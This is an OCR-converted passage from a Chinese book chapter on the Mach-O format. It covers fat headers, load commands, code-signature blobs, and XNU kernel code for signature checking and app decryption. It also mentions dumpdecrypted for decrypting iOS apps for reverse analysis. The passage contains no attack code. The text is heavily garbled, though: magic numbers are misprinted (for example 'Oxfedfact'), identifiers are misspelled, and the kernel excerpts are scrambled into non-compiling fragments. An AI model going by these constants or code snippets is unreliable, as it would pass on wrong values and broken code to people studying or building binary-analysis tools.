#define CPU_TYPE_HPPA ((cpu_type_t) 11)
#define CPU_TYPE_ARM ((cpu_type_t) 12)
#define CPU_TYPE_ARM64 (CPU_TYPE_ARM | CPU_ARCH_ABI64)

#define CPU_TYPE_MC88000 ((cpu_type_t) 13)
#define CPU_TYPE_SPARC ((cpu_type_t) 14)
#define CPU_TYPE_I860 ((cpu_type_t) 15)
#define CPU_TYPE_POWERPC ((cpu_type_t) 18)
#define CPU_TYPE_POWERPC64 ((CPU_TYPE_POWERPC | CPU_ARCH_ABI64

在macOS平台上的CPU类型一般为CPU_TYPE_X86_64。

cpusubtype指定了CPU的子类型为cpu_subtype_t。CPU子类型主要有如下几种。

#define CPU_SUBTYPE_MASK 0xff000000
#define CPU_SUBTYPE_LIB64 0x80000000
#define CPU_SUBTYPE_X86_ALL ((cpu_subtype_t)3)
#define CPU_SUBTYPE_X86_64_ALL ((cpu_subtype_t)3)
#define CPU_SUBTYPE_X86_ARCH1 ((cpu_subtype_t)4)
#define CPU_SUBTYPE_X86_64_H ((cpu_subtype_t)8)

其中，CPU_SUBTYPE_LIB64与CPU_SUBTYPE_X86_64_ALL比较常见。

offset字段指明了当前CPU架构数据相对于当前文件开头的偏移值，size字段指明了数据的大小。align字段指明了数据的内存对齐边界，取值必须是2的次方，它确保了当前CPU架构的目标文件在加载到内存中时，数据是经过内存优化对齐的。

可以使用otool工具打印本机安装的python程序的fat_header信息，如下所示：

otool -f -V /usr/bin/python
Fat headers
fat_magic FAT_MAGIC
nfat_arch 2
architecture i386
cputype CPU_TYPE_I386
cpusubtype CPU_SUBTYPE_I386_ALL
capabilities 0x0
offset 4096
size 29632
align 2^12 (4096)
architecture x86_64
cputype CPU_TYPE_X86_64
cpusubtype CPU_SUBTYPE_X86_64_ALL
capabilities CPU_SUBTYPE_LIB64
offset 36864
size 29872
align 2^12 (4096)

如果你使用UNIX，并且经常使用GNU里面的binutils提供的objdump查看可执行文件信息的话，那么在macOS上可以使用它的移植版本gobjdump，使用HomeBrew运行以下命令进行安装：

$ brew install binutils

完装完成后，执行以下命令可以查看python程序的fat_header信息：

$ gobjdump -f /usr/bin/python
In archive /usr/bin/python:

i386: file format mach-o-i386
architecture: i386, flags 0x00000012:
EXEC_P, HAS_SYMS
start address 0x00001be0

i386:x86-64: file format mach-o-x86-64
architecture: i386:x86-64, flags 0x00000012:
EXEC_P, HAS_SYMS
start address 0x0000000100000e20

fat_arch结构体往下就是具体的Mach-O文件格式了，这部分内容比较复杂，我们将在下一节进行详细讨论。

### 4.5 Mach-O 文件格式

Mach-O（Mach Object File Format）描述了macOS系统上可执行文件的格式。熟悉Mach-O文件格式有助于了解苹果底层软件的运行机制，更好地掌握dy1d加载Mach-O的步骤，为动手开发Mach-O相关的加解密工具打下良好的基础。

#### 4.5.1 Mach-O 简介

一个典型的Mach-O文件格式如图4-4所示。

 </div>

可以看出，Mach-O主要由以下3部分组成。

☐ Mach-O头部（mach header）。描述了Mach-O的CPU架构、文件类型以及加载命令等信息。

口加载命令（load command）。描述了文件中数据的具体组织结构，不同的数据类型使用不同的加载命令表示。

Data。Data中每个段（segment）的数据都保存在这里，段的概念与ELF文件中段的概念类似。每个段都有一个或多个Section，它们存放了具体的数据与代码。

#### 4.5.2 Mach-O 头部

与Mach-O文件格式有关的结构体可以直接或间接地在mach-o/loader.h文件中找到。32位与64位架构的CPU，分别使用了mach_header与mach_header_64结构体来描述Mach-O头部。

mach_header结构体的定义如下：

struct mach_header {
    uint32_t magic;
    cpu_type_t cputype;
    cpu_subtype_t cpusubtype;
    uint32_t filetype;
    uint32_t ncmds;
    uint32_t sizeofcmds;
    uint32_t flags;
};

这里的magic字段与fat_header结构体中的magic字段一样，表示Mach-O文件的魔数值。对于32位架构的程序来说，它的取值是MH_MAGIC，固定为0xfeedface。

cputype与cpusubtype字段与fat_header结构体中的含义完全相同。

filetype字段表示Mach-O的具体文件类型。它的取值如下所示：

#define MH_OBJECT 0x1
#define MH_EXECUTE 0x2
#define MH_FVMLIB 0x3
#define MH_CORE 0x4
#define MH_PRELOAD 0x5
#define MH_DYLIB 0x6
#define MH_DYLINKER 0x7
#define MH_BUNDLE 0x8
#define MH_DYLIB_STUB 0x9
#define MH_DSYM 0xa
#define MH_KEXT_BUNDLE 0xb

本节主要关注MH_EXECUTE与MH_DYLIB这两种文件格式。

接下来，ncmds指明了Mach-O文件中加载命令的数量。sizeofcmds字段指明了Mach-O文件加载命令所占的总字节大小。flags字段表示文件标志，它是一个含有一组位标志的整数，指明了Mach-O文件的一些标志信息，可用的值如下所示：

#define MH_NOUNDEFS 0x1

#define MH_INCRLINK 0x2
#define MH_DYLDLINK 0x4
#define MH_LAZY_INIT 0x40
#define MH_TWOLEVEL 0x80
#define MH_PIE 0x200000

64位Mach-O的mach_header_64结构体定义如下：

struct mach_header_64 {
    uint32_t magic;
    cpu_type_t cputype;
    cpu_subtype_t cpusubtype;
    uint32_t filetype;
    uint32_t ncmds;
    uint32_t sizeofcmds;
    uint32_t flags;
    uint32_t reserved;
};

相比mach_header，它多了一个reserved字段，目前它的取值系统保留。mach_header_64结构体中的字段与mach_header中的基本一致，不同的是magic字段的取值是MH_MAGIC_64，固定的值为Oxfedfact。

学习Mach-o文件格式时，可以使用辅助工具查看具体的文件结构，效果会更加直观。图4-5是使用MachOView查看optool程序Mach64 Header的效果，图4-6是使用010 Editor查看optool程序Mach64 Header的效果，图4-7是使用Synalyze It!查看optool程序Mach64 Header的效果。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>0000h:</td><td style='text-align: center; word-wrap: break-word;'>0000</td><td style='text-align: center; word-wrap: break-word;'>0000</td><td style='text-align: center; word-wrap: break-word;'>000</td></tr></table>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>0</td><td style='text-align: center; word-wrap: break-word;'>0</td><td style='text-align: center; word-wrap: break-word;'>0</td></tr></table>

 </div>

这3款工具对于学习Mach-O文件格式都是非常有帮助的，建议读者在实际分析时可以适当使用。

#### 4.5.3 加载命令

在mach_header之后是Load Command加载命令，这些加载命令在Mach-O文件加载解析时，会被内核加载器或者动态链接器调用，基本的加载命令的数据结构如下：

struct load_command {
    uint32_t cmd; /* type of load command */
    uint32_t cmdsize; /* total size of command in bytes */
};

此结构对应的成员只有两个：cmd字段代表当前加载命令的类型，cmdsize字段代表当前加载命令的大小。

cmd的类型不同，所代表的加载命令的类型就不同，它的结构体也会有所不同。不同类型的加载命令会在load_command结构体后面加上一个或多个字段来表示特定的结构体信息。

在macOS系统进化的过程中, 加载命令是更新比较频繁的一个数据结构体。截至macOS 10.12系统, 加载命令的类型cmd的取值共有48种, 它们的部分定义如下:

#define LC_SEGMENT 0x1
#define LC_SYMTAB 0x2
#define LC_SYMSEG 0x3
#define LC_THREAD 0x4
#define LC_UNIXTHREAD 0x5
#define LC_LOADFVMLIB 0x6
#define LC_IDFVMLIB 0x7
#define LC_IDENT 0x8
#define LC_FVMFILE 0x9
#define LC_PREPAGE 0xa
#define LC_DYSYMTAB 0xb
#define LC_LOAD_DYLIB 0xc
#define LC_ENCRYPTION_INFO_64 0x2C
#define LC_LINKER_OPTION 0x2D
#define LC_LINKER_OPTIMIZATION_HINT 0x2E
#ifndef OPEN_SOURCE
#define LC_VERSION_MIN_TVOS 0x2F
#endif
#define LC_VERSION_MIN_WATCHOS 0x30

所有这些加载命令由系统内核加载器直接使用，或由动态链接器处理。其中几个常见的加载命令为 LC_SEGMENT、LC_LOAD_DYLINKER、LC_LOAD_DYLIB、LC_MAIN、LC_CODE_SIGNATURE、LC_ENCRYPTION_INFO等。下面我们分别进行介绍。

□ LC_SEGMENT：表示这是一个段加载命令，需要将它加载到对应的进程空间中。段加载命令将在下一节讨论。

□ LC_LOAD_DYLIB：表示这是一个需要动态加载的链接库。它使用dylib_command结构体表示。定义如下：

struct dylib_command {
    uint32_t cmd;
    uint32_t cmdsize;
    struct dylib dylib;
};

当cmd类型是LC_ID_DYLIB、LC_LOAD_DYLIB、LC_LOAD_WEAK_DYLIB与LC_REEXPORT_DYLIB时，统一使用dylib_command结构体表示。使用dylib结构体来存储要加载的动态库的具体信息，如下所示：

struct dylib {
    union lc_str name;
    uint32_t timestamp;
    uint32_t current_version;
    uint32_t compatibility_version;
};

name字段是动态库的完整路径，动态链接器在加载动态库时，会通过此路径进行加载。timestamp字段描述了动态库构建时的时间戳。current_version与compatibility_version指明了当前版本与兼容的版本号。

□ LC_MAIN：此加载命令记录了可执行文件的主函数main()的位置，它使用entry_point_command结构体表示。定义如下：

struct entry_point_command {
    uint32_t cmd;
    uint32_t cmdsize;
    uint64_t entryoff;
    uint64_t stacksize;
};

entryoff字段指定了main()函数的文件偏移。stacksize指定了初始的堆栈大小。

#### 4.5.4 LC_CODE_SIGNATURE

LC_CODE_SIGNATURE是代码签名加载命令，描述了Mach-O的代码签名信息，它属于链接信息，使用linkedit_data_command结构体表示。定义如下：

struct linkedit_data_command {
    uint32_t cmd;
    uint32_t cmdsize;
    uint32_t dataoff;
    uint32_t datasize;
};

   </div>

dataoff字段指明了相对于_LINKEDIT段的文件偏移位置，datasize字段指明了数据的大小。那么，如何删除Mach-O中包含的代码签名信息呢？与代码签名相关的数据定义可以在xnu内

核代码的bsd/sys/codesign.h文件中找到。整个代码签名部分的头部使用一个CS_SuperBlob结构体定义，它的原型如下：

typedef struct _SC_SuperBlob {
    uint32_t magic;
    uint32_t length;
    uint32_t count;
    CS_BlobIndex index];
} CS_SuperBlob;

magic字段指明了Blob的类型，可选值如下：

enum {
    CSMAGIC_REQUIREMENT = Oxfade0c00,
    CSMAGIC_REQUIREMENTS = Oxfade0c01,
    CSMAGIC_CODEDIRECTORY = Oxfade0c02,
    CSMAGIC_EMBEDDED_SIGNATURE = Oxfade0c0,
    CSMAGIC_EMBEDDED_SIGNATURE_OLD = Oxfade0b02,
    CSMAGIC_EMBEDDED_ENTITLEMENTS = Oxfade7171,
    CSMAGIC_DETACHED_SIGNATURE = Oxfade0cc1,
    CSMAGIC_BLOBWRAPPER = Oxfade0b01,
}

对于第一个Blob来说，它的值必定是CSMAGIC_EMBEDDED_SIGNATURE，表示代码签名采用的是嵌入式的签名信息。

length字段指明了整个SuperBlob的大小,其中包含了即将介绍的CodeDirectory、Requirement与Entitlement的大小。count字段指明了接下来会有多少个子条目。从index开始，就是每一个子条目的索引了，它的结构是CS_BlobIndex，定义如下：

typedef struct _BlobIndex {
    uint32_t type;
    uint32_t offset;
} CS_BlobIndex;

type指明了子条目的类型，可选值如下：

CSSLOT_CODEDIRECTORY = 0,
CSSLOT_INFOSLOT = 1,
CSSLOT_REQUIREMENTS = 2,
CSSLOT_RESOURCEDIR = 3,
CSSLOT_APPLICATION = 4,
CSSLOT_ENTITLEMENTS = 5,
CSSLOT_SIGNATURESLOT = 0x10000,

offset字段指明了子条目距离代码签名数据起始的文件偏移。

通常, 对于签名后的程序, 签名数据的第一个子条目指向的是一个type为CSSLOT_CODEDIRECTORY的结构, 它是一个CS_CodeDirectory结构体, 定义如下:

typedef struct _CodeDirectory {
    uint32_t magic;
    uint32_t length;
    uint32_t version;
}

uint32_t flags;
uint32_t hashOffset;
uint32_t identOffset;
uint32_t nSpecialSlots;
uint32_t nCodeSlots;
uint32_t codeLimit;
uint8_t hashSize;
uint8_t hashType;
uint8_t platform;
uint8_t pageSize;
uint32_t spare2;
uint32_t scatterOffset;
uint32_t teamOffset;
} CS_CodeDirectory;

该结构体数据字段较多，此处只关注与签名相关的字段。hashOffset指明了hash数据的文件相对偏移（注意是相对于当前结构体CS_CodeDirectory）。hashType与hashSize指明了代码签名时使用的算法和每一项签名数据的长度，目前macOS使用的签名算法是SHA-1，长度为20字节。

nSpecialSlots与nCodeSlots指定了代码签名数据条目的个数，前者针对代码签名中所有的Blob，后者针对程序文件内容。codesign程序在对程序进行签名时，会对SuperBlob中每个子条目进行签名，即对Blob的内容调用SHA-1算法取Hash值，nSpecialSlots的值就是子条目Blob的个数。同时，codesign会以pageSize字段指定的页大小为单位（通常取值是0x1000）对程序数据进行签名，每一页签名后生成一条签名数据，nCodeSlots的值就是签名数据的页数，即程序数据大小除以Size字段后的值。

在CS_CodeDirectory之后，就是Requirements了，它是一个CS_SuperBlob结构体，指明了Requirement的个数和每一个的偏移。接下来就是每一个Requirement数据了，它是一个CS_GenericBlob结构体，定义如下：

typedef struct _SC_GenericBlob {
    uint32_t magic;
    uint32_t length;
    char data[];
} CS_GenericBlob;

可以看到, 前两个字段与CS_SuperBlob是一样的, 只是后面多了一个data字段, 用来存放Blob的数据长度。

在Requirement数据下面，就是Entitlement了，它同样是CS_GenericBlob结构。拿本机Calculator计算器程序来说，它的Entitlement的数据内容是一个xml文件，提取出来的内容如下所示：

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>

<key>com.apple.security.files.user-selected.read-write</key>
<true/>
<key>com.apple.security.network.client</key>
<true/>
<key>com.apple.security.print</key>
<true/>
</dict>
</plist>

最后一个Blob通常是签名使用的证书，Certificates签名证书也是CS_GenericBlob结构，提取它的证书数据后保存为cer文件，使用macOS的文件预览证书内容，效果如图4-8所示。

 </div>

下面再来看系统是如何实施代码签名验证的。内核加载解析Mach-O加载命令的函数是parse_machfile()，位于内核代码XNU_SRC_Root/BSD/kern/mach_loader.c文件中，部分代码片段如下：

static load_return_t parse_machfile(
    struct vnode
    *vp,

) {

vm_map_t map,
thread_t thread,
struct mach_header *header,
off_t file_offset,
off_t macho_size,
int depth,
int64_t aslr_offset,
int64_t dyld_aslr_offset,
load_result_t *result

off_t macho_size,
int depth,
int64_t aslr_offset,
int64_t dyld_aslr_offset,
load_result_t *result

uint32_t ncmds;
struct load_command *lcp;
struct dylinker_command *dlp = 0;
integer_t dlarchbits = 0;
void * control;
load_return_t ret = LOAD_SUCCESS;
caddr_t addr;
void * kl_addr;
vm_size_t size,kl_size;
size_t offset;
size_t oldoffset;
int pass;
proc_t p = current_proc();
int error;
int resid=0;
size_t mach_header_sz = sizeof(struct mach_header);
boolean_t abi64;
boolean_t got_code_signatures = FALSE;
int64_t slide = 0;
if (header->magic == MH_MAGIC_64 || header->magic == MH_CIGAM_64) {
    mach_header_sz = sizeof(struct mach_header_64);
}

case LC_CODE_SIGNATURE:
    if (pass != 1)
        break;
    ret = load_code_signature(
        (struct linkedit_data_command *) lcp,
        vp,
        file_offset,
        mach_size,
        header->cputype,
        result);
    if (ret != LOAD_SUCCESS) {
        printf("proc %d: load code signature error %d"
                  "for file %s\\"n",
                  p->p_pid, ret, vp->v_name);
        if (!cs_enforcement(NULL))
            ret = LOAD_SUCCESS;
    }
}

} else {
    got_code_signatures = TRUE;
}

if (got_code_signatures) {
    unsigned tainted = CS_VALIDATE_TAINTED;
    boolean t valid = FALSE;
    struct cs_blob *blobs;
    vm_size_t off = 0;

    if (cs_debug > 10)
        printf("validating initial pages of %s\\n", vp->v_name);
    blobs = ubc_get_cs_blobs(vp);

    while (off < size && ret == LOAD_SUCCESS) {
        tainted = CS_VALIDATE_TAINTED;

        valid = cs_validate_page(blobs, NULL, file_offset + off, addr + off, &tainted);
        if (!valid || (tainted & CS_VALIDATE_TAINTED) {
            if (cs_debug)
                printf("CODE SIGNING: %s[%d]: invalid initial page at offset %LLd validated:%d tainted:%d csflags:0x%x\\n", vp->v_name, p->p_pid, (long long)(file_offset + off), valid, tainted, result->csflags);
            if (cs_enforcement(NULL) || (result->csflags & (CS_HARD|CS_KILL|CS_ENFORCEMENT)) {
                ret = LOAD_FAILURE;
            }
            result->csflags &= ~CS_VALID;
        }
        off += PAGE_SIZE;
    }
}

整个代码签名的验证过程大致分为load_code_signature()与cs_validate_page()两步，前者负责加载代码签名，后者负责验证数据页面。

load_code_signature()在加载代码签名时，通过调用ubc_cs_blob_get()来获取特定CPU的cs_blob指针。ubc_cs_blob_get()第一次调用时，返回的cs_blob指针为空，会调用ubc_cs_blob_add()来加载与验证文件中的Blob信息；再次调用ubc_cs_blob_get()时就会返回内存中的cs_blob指针。当然并不是直接返回，系统会再次判断内存中的cs_blob指针是否损坏或遭到篡改，具体方法是调用ubc_cs_generation_check()做初步检查，之后调用ubc_cs_blob_revalidate()对Blob做重验证。

下面是load_code_signature()函数代码:

catic load return t

pad code signature(
    struct linkedit_data_command *lcp,
    struct vnode *vp,
    off_t macho_offset,
    off_t macho_size,
    cpu_type_t cputype,
    load_result_t *result)

int ret;
kern_return_t kr;
vm_offset_t addr;
int resid;
struct cs_blob *blob;
int error;
vm_size_t blob_size;

addr = 0;
blob = NULL;

if (lcp->cmdsize != sizeof(struct linkedit_data_command) || lcp->dataoff + lcp->datasize > macho_size) {
    ret = LOAD_BADMACHO;
    goto out;
}

blob = ubc_cs_blob_get(vp, cputype, macho_offset);
if (blob != NULL) {
    if (blob->csb_cpu_type == cputype &&
        blob->csb_base_offset == macho_offset &&
        blob->csb_mem_size == lcp->datasize) {
        if (0 != ubc_cs_generation_check(vp)) {
            if (0 != ubc_cs_blob_revalidate(vp, blob, 0)) {
                ret = LOAD_FAILURE;
                goto out;
            }
        }
        ret = LOAD_SUCCESS;
    } else {
        ret = LOAD_BADMACHO;
    }
    goto out;
}

blob_size = lcp->datasize;
kr = ubc_cs_blob_allocate(&addr, &blob_size);
if (kr != KERN_SUCCESS) {
    ret = LOAD_NOSPACE;
    goto out;
}

resid = 0;
error = vn_rdwr(UIO_READ,
                    vp,
                    (caddr_t) addr,

lpc->datasize,
macho_offset + lcp->dataoff,
UIO_SYSSPACE,
0,
kauth_cred_get(),
&resid,
current_proc();
if (error || resid != 0) {
    ret = LOAD_IOERROR;
    goto out;
}

if (ubc_cs_blob_add(vp,
                      cputype,
                      macho_offset,
                      addr,
                      lcp->datasize,
                      0)) {
        ret = LOAD_FAILURE;
        goto out;
    } else {
        addr = 0;
    }

    #if CHECK_CS_VALIDATION_BITMAP
        ubc_cs_validation_bitmap_allocate(vp);
    #endif

    blob = ubc_cs_blob_get(vp, cputype, macho_offset);
    ret = LOAD_SUCCESS;
    out:
        if (ret == LOAD_SUCCESS) {
            result->csflags | = blob->csb_flags;
            result->platform_binary = blob->csb_platform_binary;
            result->cs_end_offset = blob->csb_end_offset;
        }
        if (addr != 0) {
            ubc_cs_blob_deallocate(addr, blob_size);
            addr = 0;
        }
    }
    return ret;
}

注意，前面提到的cs_blob指针，其实就是代码签名数据中的CS_Super

ubc_cs_blob_add()的代码比较长，它主要做了以下3项工作。

(1) 调用cs_validate_csblob()验证cs_blob指针的合法性，cs_validate_csblob()会对CSMAGIC_EMBEDDED_SIGNATURE与CSMAGIC_CODEDIRECTORY做相应的验证处理，包括调用cs_validate_codedirectory()验证CS_CodeDirectory结构体的合法性，以及调用cs_validate_blob()来验证CS_SuperBlob中每一个CS_GenericBlob是否合法有效。

(2) 调用mac_vnode_check_signature()验证Blob块的代码签名，也就是比较Blob块的SHA1哈希值与计算的值是否相同。

(3) 加载所有的代码签名Hash信息，填充cs_blobs字段，为下一步的内存页签名验证做准备。ubc_cs_blob_revalidate()做的验证检查几乎与ubc_cs_blob_add()相同，但因为已经有了一些缓存信息，因此检查时会快一些。load_code_signature()完成以后，会调用ubc_get_cs_blobs()获取cs_blobs指针，最后调用cs_validate_page()，逐页验证文件中每一页数据的签名。

以上检查做完后，LC_CODE_SIGNATURE就处理完了。如果没有错误发生，就表示代码签名验证通过了。

讲完了代码签名，下面我们再讲讲代码加密。Mach-O程序如果使用了代码加密技术，在加载命令列表中会有一个LC_ENCRYPTION_INFO加载命令，它存储了Mach-O的加密信息。对于此加载命令，有iOS程序逆向经验的读者应该不会感到陌生。iOS系统由于安全机制的原因，会对App Store中上架的应用默认开启数据加密。

被加密的App文件，部分段的数据内容是经过加密的，而记录加密数据的关键就是LC_ENCRYPTION_INFO加载命令。分析人员要想对加密过的App进行逆向分析，必须先经过一次解密（俗称“砸壳”）操作。

LC_ENCRYPTION_INFO使用encryption_info_command结构体表示（LC_ENCRYPTION_INFO_64使用encryption_info_command_64表示），定义如下：

struct encryption_info_command {
    uint32_t cmd;
    uint32_t cmdsize;
    uint32_t cryptoff;
    uint32_t cryptsize;
    uint32_t cryptid;
};

cryptoff与cryptsize字段分别指明了加密数据的文件偏移与大小，cryptid指定了使用的加密系统。

聪明的安全研究人员根据Mach-O在内存中被加载完即解密完成的特点，开发出了针对iOS平台App的代码解密工具dumpdecrypted $ ^{①} $，将内存中解密的数据写回原位置，并将cryptid置为0，来达到解密App的目的。

下面再来看看系统如何处理LC_ENCRYPTION_INFO，它的解析函数也是parse_machine()，代码片段如下：

static load_return_t parse_machfile(
    struct vnode *vp,
    vm_map_t map,
    thread_t thread,
)

struct mach_header *header,
off_t file_offset,
off_t macho_size,
int depth,
int64_t aslr_offset,
int64_t dyld_aslr_offset,
load_result_t *result
)
{
    ••••••

#if CONFIG_CODE_DECRYPTION
    case LC_ENCRYPTION_INFO:
        case LC_ENCRYPTION_INFO_64:
            if (pass != 3)
                break;
        ret = set_code_unprotect(
                    (struct encryption_info_command *) lcp,
                    addr, map, slide, vp,
                    header->cputype, header->cpusubtype);
        if (ret != LOAD_SUCCESS) {
            printf("proc %d: set_code_unprotect() error %d"
                "for file \"%s\"\\n",
                p->p_pid, ret, vp->v_name);
            if (ret == LOAD_DECRYPTFAIL) {
                proc_lock(p);
                p->p_lflag | = P_LTERM_DECRYPTFAIL;
                proc_unlock(p);
            }
                psignal(p, SIGKILL);
            }
            break;
        #endif
    }
    default:
        ret = LOAD_SUCCESS;
    break;

当系统内核被配置为启用代码解密（即定义了CONFIG_CODE_DESCRIPTION）之后，parse_machfile()函数会解析LC_ENCRYPTION_INFO与LC_ENCRYPTION_INFO_64加载命令。

最后调用了`set_code_unprotect()`函数来对代码进行解密。该函数通过`encryption_info_command`中的`cryptid`来确定使用的加密系统，然后对代码进行内存解密。代码片段如下：

static load_return_t
set_code_unprotect(
    struct encryption_info_command *eip,
    caddr_t addr,
    vm_map_t map,
    int64_t slide,
    struct vnode *vp,
    cpu_type_t cputype,
)

cpu_subtype_t cpusubtype)

if (eip->cmdsize < sizeof(*eip)) return LOAD_BADMACHO;

switch(eip->cryptid) {
    case 0:
        return LOAD_SUCCESS;
    case 1:
        cryptname="com.apple.unfree";
        break;
    case 0x10:
        cryptname="com.apple.null";
        break;
    default:
        return LOAD_BADMACHO;
}

if (map == VM_MAP_NULL) return (LOAD_SUCCESS);
if (NULL == text_crypter_create) return LOAD_FAILURE;

crypt_file_data_t crypt_data = {
    .filename = vpath,
    .cputype = cputype,
    .cpusubtype = cpusubtype;
    kr = text_crypter_create(&crypt_info, cryptname, (void*)&crypt_data);
    FREE_ZONE(vpath, MAXPATHLEN, M_NAMEI);

    offset = mach_header_sz;
    uint32_t ncmds = header->ncmds;
    while (ncmds--) {
        struct load_command *lcp = (struct load_command *)(addr + offset);
        offset += lcp->cmdsize;

        switch(lcp->cmd) {
            case LC_SEGMENT_64:
                seg64 = (struct segment_command_64 *)lcp;
                if ((seg64->fileoff <= eip->cryptoff) &&
                    (seg64->fileoff + seg64->filesize >=
                    eip->cryptoff + eip->cryptsize)) {
                map_offset = seg64->vmaddr + eip->cryptoff - seg64->fileoff + slide;
                map_size = eip->cryptsize;
                goto remap_now;
            }
            case LC_SEGMENT:
                seg32 = (struct segment_command *)lcp;
                if ((seg32->fileoff <= eip->cryptoff) &&
                    (seg32->fileoff + seg32->filesize >=
                    eip->cryptoff + eip->cryptsize)) {
                map_offset = seg32->vmaddr + eip->cryptoff - seg32->fileoff + slide;
                map_size = eip->cryptsize;
            }
        }
    }
}

goto remap_now;
}
}
return LOAD_BADMACHO;

remap_now:
kr = vm_map_apple_protected(map, map_offset, map_offset+map_size, &crypt_info);
if(kr) {
    printf("set_code_unprotect(): mapping failed with %x\n", kr);
    crypt_info.crypt_end(crypt_info.crypt_ops);
    return LOAD_PROTECT;
}
return LOAD_SUCCESS;
}
#endif

text_crypter_create() 是一个 text_crypter_create_hook_t 类型全局指针，
imk/kern/page_decrypt.c 文件中通过 text_crypter_create_hook_set() 进行设置。

在填充完解密所需的信息crypt_info后，text_crypter_create()会再次计算需要重新解密映射到内存的地址与大小，调用vm_map_apple_protected()进行解密操作。

由于内核的代码可以直接审阅，数据加密在macOS系统上显得意义不大。在目前最新的macOS 10.12系统上，苹果没有启用代码解密功能，LC_ENCRYPTION_INFO与LC_ENCRYPTION_INFO_64加载命令也就没那么常见了。

最后，可以使用otool命令行工具查看Mach-O文件的加载命令信息：

otool -l /usr/bin/python
/usr/bin/python:
Load command 0
cmd LC_SEGMENT_64
cmdsize 72
segname PAGEZERO
vmaddr 0x00000000000000
vmsize 0x000000010000000
fileoff 0
filesize 0
maxprot 0x00000000
initprot 0x00000000
nsects 0
flags 0x0
Load command 1
cmd LC_SEGMENT_64
.....
Load command 15
cmd LC_DATA_IN_CODE
cmdsize 16
dataoff 17776

datasize 0
Load command 16
cmd LC_CODE_SIGNATURE
cmdsize 16
dataoff 20528
datasize 9344

也可以使用MachOView查看，效果如图4-9所示。

 </div>

#### 4.5.5 LC_SEGMENT

段加载命令LC_SEGMENT描述了32位Mach-O文件的段信息，使用segment_command结构体来表示，它的定义如下：

struct segment_command {
    uint32_t cmd;
    uint32_t cmdsize;
    char segname[16];
    uint32_t vmaddr;
    uint32_t vmsize;
    uint32_t fileoff;
    uint32_t filesize;
    vm_prot_t maxprot;
    vm_prot_t initprot;
    uint32_t nsects;
    uint32_t flags;
};

sigma字段是一个16字节大小的空间，用来存储段的名称。

vmaddr字段指明了段要加载的虚拟内存地址。

vmsize字段指明了段所占的虚拟内存的大小。

fileoff字段指明了段数据所在文件中的偏移地址。

filesize字段指明了段数据实际的大小。
maxprot字段指明了页面所需要的最高内存保护。
initprot字段指明了页面初始的内存保护。
nsects字段指明了段所包含的节区。
flags字段指明了段的标志信息。

与LC_SEGMENT对应的是LC_SEGMENT_64，它使用segment_command_64结构体表示，描述了64位Mach-O文件的段的基本信息，定义如下：

struct segment_command_64 {
    uint32_t cmd;
    uint32_t cmdsize;
    char segname[16];
    uint64_t vmaddr;
    uint64_t vmsize;
    uint64_t fileoff;
    uint64_t filesize;
    vm_prot_t maxprot;
    vm_prot_t initprot;
    uint32_t nsects;
    uint32_t flags;
};

所有的字段含义与32位的基本一致，下面我们重点讨论最后4个字段。

一个编译后可能执行的程序会分成多个段，不同类型的数据放入不同的段中。程序的代码被称作代码段，放入一个名为___TEXT的段中，代码段的maxprot字段在编译时被设置成VM_PROT_READ（可读）、VM_PROT_WRITE（可写）、VM_PROT_EXECUTE（可执行），initprot字段被设置成VM_PROT_READ与VM_PROT_EXECUTE，这样做是合理的。一个普通的应用程序，代码段部分通常是不可写的，有特殊需求的程序，如果要求代码段可写，必须在编译时设置它的initprot字段为VM_PROT_WRITE。

nsects字段指定了段加载命令包含几个节区，一个段可以包含0个或多个节区。如_PAGEZERO段就不包含任何节区，该段被称为空指针陷阱段，映射到虚拟内存空间的第一页，用于捕捉对NULL指针的引用。

当一个段包含多个节区时，节区信息会以数组的形式存储在段加载命令后面。节区使用结构体section表示（64位使用section_64表示），定义如下：

struct section {
    char    sectname[16];
    char    segname[16];
    uint32_t    addr;
    uint32_t    size;
    uint32_t    offset;
    uint32_t    align;
    uint32_t    reloff;
    uint32_t    nreloc;
    uint32_t    flags;
    uint32_t    reserved1;
}

uint32_t reserved2;
};

sectname字段表示节区的名称，segname字段表示节区所在的段名，addr与size指明了节区所在的内存地址与大小，offset指明了节区所在的文件偏移，align表示节区的内存对齐边界，reloff指明了重定位信息的文件偏移，nreloc表示重定位条目的数目，flags则是节区的一些标志属性。

段加载命令的最后一个字段flags存储了段的一些标志属性，取值如下：

#define SG_HIGHVM 0x1
#define SG_FVMLIB 0x2
#define SG_NORELOC 0x4
#define SG_PROTECTED_VERSION_1 0x8

值得关注的是SG_PROTECTED_VERSION_1，当段被设置了该标志位时，表示段是经过加密的。在macOS版本10.6以前，系统使用AES算法进行段的加密与解密，10.6版本则使用了Blowfish加密算法。著名的iOS逆向工具class-dump $ ^{①} $提供了一个静态数据段解密工具deprotect，有兴趣的读者可以参看它的代码来了解段解密部分。

最后，使用MachOView工具查看系统python程序_TEXT段的信息，如图4-10所示。

 </div>

### 4.6 动态库

Windows系统的动态库是DLL文件，Linux系统是so文件，macOS系统的动态库则使用dylib

文件。dylib本质上是一个Mach-O格式的文件，它与普通的Mach-O执行文件使用几乎一样的结构，只是在文件类型上一个是MH_DYLIB，一个是MH_EXECUTE。

在系统的/usr/lib目录下，存放了大量供系统和应用程序调用的动态库文件，使用`file`命令查看系统动态库`libobjc.dylib`的信息，输出如下：

$ file /usr/lib/libobjc.dylib
/usr/lib/libobjc.dylib: Mach-0 universal binary with 3 architectures
/usr/lib/libobjc.dylib (for architecture i386): Mach-0 dynamically linked shared library i386
/usr/lib/libobjc.dylib (for architecture x86_64): Mach-0 64-bit dynamically linked shared library x86_64
/usr/lib/libobjc.dylib (for architecture x86_64h): Mach-0 64-bit dynamically linked shared library x86_64

从输出信息可以看出, libobjc.dylib是一个通用的二进制文件, 包含了3种CPU架构的Mach-O。另外, 可以使用Mach-O格式文件管理工具otool查看dylib的信息, 如查看动态库的依赖库信息, 如下所示:

$ otool -L /usr/lib/libobjc.dylib
/usr/lib/libobjc.dylib:
/usr/lib/libobjc.A.dylib (compatibility version 1.0.0, current version 228.0.0)
/usr/lib/libauto.dylib (compatibility version 1.0.0, current version 1.0.0)
